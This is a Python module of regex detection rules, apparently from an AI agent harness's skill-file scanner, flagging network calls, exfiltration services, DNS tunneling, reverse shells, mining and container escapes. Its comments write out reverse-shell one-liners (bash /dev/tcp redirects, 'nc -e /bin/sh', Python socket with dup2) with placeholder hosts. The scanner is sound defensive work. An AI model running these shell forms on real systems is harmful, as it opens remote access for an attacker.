"""[INPUT]
- myrm_agent_harness.backends.skills.scanning.scanner::ScanSeverity (POS: myrm_agent_harness.backends.skills.scanning.scanner)
- myrm_agent_harness.backends.skills.scanning.patterns.types::PatternList (POS: patterns 子包共用类型；避免每个模式模块重复导入 scanner。)

[OUTPUT]
- （仅导出常量/类型）

[POS]
patterns 子包的一部分；纯数据，由 __init__.py 汇总。
"""

from __future__ import annotations

import re

from ..scanner import ScanSeverity
from .types import PatternList

NETWORK_PATTERNS: PatternList = [
    (
        re.compile(r"\b(?:socket\.connect|urllib\.request|requests\.(?:get|post|put|delete))\b", re.IGNORECASE),
        "Network: direct network API usage",
        ScanSeverity.MEDIUM,
    ),
    (
        re.compile(r"\b(?:bind|listen)\s*\(\s*(?:['\"]0\.0\.0\.0|['\"]::)", re.IGNORECASE),
        "Network: opening a server socket",
        ScanSeverity.HIGH,
    ),
    (
        re.compile(r"\bngrok\b|\blocaltunnel\b|\bserveo\b|\bcloudflared\b", re.IGNORECASE),
        "Network: tunneling service for external access",
        ScanSeverity.HIGH,
    ),
    (
        re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}"),
        "Network: hardcoded IP address with port",
        ScanSeverity.MEDIUM,
    ),
    (
        re.compile(r"webhook\.site|requestbin\.com|pipedream\.net|hookbin\.com", re.IGNORECASE),
        "Network: known data exfiltration/webhook testing service",
        ScanSeverity.HIGH,
    ),
    (
        re.compile(r"pastebin\.com|hastebin\.com|ghostbin\.", re.IGNORECASE),
        "Network: paste service (possible data staging)",
        ScanSeverity.MEDIUM,
    ),
    (
        re.compile(r"0\.0\.0\.0:\d+|INADDR_ANY", re.IGNORECASE),
        "Network: binding to all interfaces",
        ScanSeverity.HIGH,
    ),
]

DNS_TUNNELING_PATTERNS: PatternList = [
    (
        re.compile(r"\b(?:dns\.resolver|dnspython)\b", re.IGNORECASE),
        "DNS tunneling: DNS resolver library usage",
        ScanSeverity.MEDIUM,
    ),
    (
        re.compile(r"\b(?:nslookup|dig)\s+.*TXT\b", re.IGNORECASE),
        "DNS tunneling: TXT record query (potential data channel)",
        ScanSeverity.MEDIUM,
    ),
]

# Reverse-shell building blocks. Rules match one line at a time and skill files are untrusted input up to 512 KB, so
# every window is bounded: an open-ended quantifier behind a repeated prefix would make a rule quadratic in the line.
_NEAR = r".{0,200}?"
_DEV_SOCKET = r"/dev/(?:tcp|udp)/"
# sh/bash/dash/zsh/ksh as a whole word: not ssh, not the tail of run.sh, not a host such as sh.example.com.
_SHELL_NAME = r"(?:ba|da|z|k)?sh(?![\w.-])"
_SHELL = r"(?<![\w.-])" + _SHELL_NAME
_EXEC_TARGET = r"(?:" + _SHELL_NAME + r"|(?:cmd|powershell)(?:\.exe)?(?![\w.-]))"
_STDIN_FROM_FD = r"\b0<&\d+"
# Only descriptors above 2 are sockets or pipes; 2>&1 and 2>&2 merely merge streams in ordinary scripts.
_STDERR_TO_FD = r"\b2>&(?:[3-9]|\d{2,})\b"
_NET_CLIENT = r"(?:nc|ncat|netcat|telnet|openssl\s+s_client)\b"

# A bash TCP/UDP socket is a legitimate client too (port probes, HTTP requests, "exec 3<>/dev/tcp/h/p"), so these forms
# demand what only a remote shell does: shell streams redirected to the socket, stdin rewired to it, or stderr sent
# down a descriptor next to it.
_BASH_SOCKET_SHELL_FORMS = (
    r"(?:>&|&>)\s*" + _DEV_SOCKET,  # bash -i >& /dev/tcp/H/P 0>&1
    r"\b0<\s*" + _DEV_SOCKET,  # exec /bin/sh 0</dev/tcp/H/P 1>&0 2>&0
    _STDIN_FROM_FD + _NEAR + _DEV_SOCKET,  # 0<&196;exec 196<>/dev/tcp/H/P
    _DEV_SOCKET + _NEAR + _STDERR_TO_FD,  # exec 5<>/dev/tcp/H/P;cat <&5 | while read line; do $line 2>&5 >&5; done
    _STDERR_TO_FD + _NEAR + _DEV_SOCKET,  # sh <&5 >&5 2>&5 5<>/dev/tcp/H/P (redirections may trail the command)
    _SHELL + r"\s+-[a-z]*i\b" + _NEAR + r">\s*" + _DEV_SOCKET,  # bash -i > /dev/tcp/H/P, bash -i 5<> /dev/tcp/H/P
)

REVERSE_SHELL_PATTERNS: PatternList = [
    (
        re.compile(r"\bnc\s+-[lp]|ncat\s+-[lp]|\bsocat\b", re.IGNORECASE),
        "Reverse shell: netcat/socat listener",
        ScanSeverity.CRITICAL,
    ),
    (
        # nc -e /bin/sh H P, nc H P -e sh, nc -c sh H P, ncat --sh-exec 'bash -i' H P, nc.exe -e cmd.exe H P
        re.compile(
            r"\b(?:nc|ncat|netcat)\b.{0,80}?\s(?:-[a-z]*[ec]|--(?:sh-)?exec)\s+['\"]?(?:\S*/)?" + _EXEC_TARGET,
            re.IGNORECASE,
        ),
        "Reverse shell: netcat/ncat executing a shell on connect",
        ScanSeverity.CRITICAL,
    ),
    (
        re.compile("|".join(_BASH_SOCKET_SHELL_FORMS), re.IGNORECASE),
        "Reverse shell: bash redirects shell I/O to /dev/tcp or /dev/udp",
        ScanSeverity.CRITICAL,
    ),
    (
        # rm f;mkfifo f;cat f|sh -i 2>&1|nc H P >f, sh -i 2>&1 | openssl s_client -connect H:P
        re.compile(_SHELL + r"\s+-[a-z]*i\b[^|]{0,40}\|\s*" + _NET_CLIENT, re.IGNORECASE),
        "Reverse shell: interactive shell piped into a network client",
        ScanSeverity.CRITICAL,
    ),
    (
        # nc H P | sh, nc H P </tmp/p | sh >/tmp/p 2>&1, telnet H | bash
        re.compile(r"\b(?:nc|ncat|netcat|telnet)\s+[\w.-]+[^|]{0,40}\|\s*(?:\S*/)?" + _SHELL_NAME, re.IGNORECASE),
        "Reverse shell: network client output piped into a shell",
        ScanSeverity.CRITICAL,
    ),
    (
        # python -c 'import socket,...', python3.11 -u -c "import os,pty,socket;..."
        re.compile(r"python[\d.]*\s+(?:-\w+\s+)*-c\s+[\"']import\s+(?:\w+\s*,\s*)*socket", re.IGNORECASE),
        "Reverse shell: Python one-liner socket connection",
        ScanSeverity.CRITICAL,
    ),
    (
        # s=socket.socket();s.connect((H,P));os.dup2(s.fileno(),0);... on one line of a script
        re.compile(
            r"\bsocket\b" + _NEAR + r"(?:\.connect|create_connection)\w*\s*\(" + _NEAR + r"\bdup2\s*\(", re.IGNORECASE
        ),
        "Reverse shell: Python socket wired to stdio via dup2",
        ScanSeverity.CRITICAL,
    ),
    (
        re.compile(r"socket\.connect\s*\(\s*\(", re.IGNORECASE),
        "Reverse shell: Python socket connect to arbitrary host",
        ScanSeverity.HIGH,
    ),
    (
        re.compile(r"\bchild_process\.(?:exec|spawn|fork)\s*\(", re.IGNORECASE),
        "Reverse shell: Node.js child_process execution",
        ScanSeverity.HIGH,
    ),
]

CRYPTO_MINING_PATTERNS: PatternList = [
    (
        re.compile(r"\b(?:xmrig|stratum\+tcp|monero|coinhive|cryptonight)\b", re.IGNORECASE),
        "Crypto mining: cryptocurrency mining reference",
        ScanSeverity.CRITICAL,
    ),
]

CONTAINER_ESCAPE_PATTERNS: PatternList = [
    (
        re.compile(r"\b(?:docker\s+run|nsenter|unshare)\b", re.IGNORECASE),
        "Container escape: container/namespace manipulation",
        ScanSeverity.HIGH,
    ),
    (
        re.compile(r"\bmount\s+.*(?:/proc|/sys|/dev)", re.IGNORECASE),
        "Container escape: sensitive filesystem mount",
        ScanSeverity.CRITICAL,
    ),
]
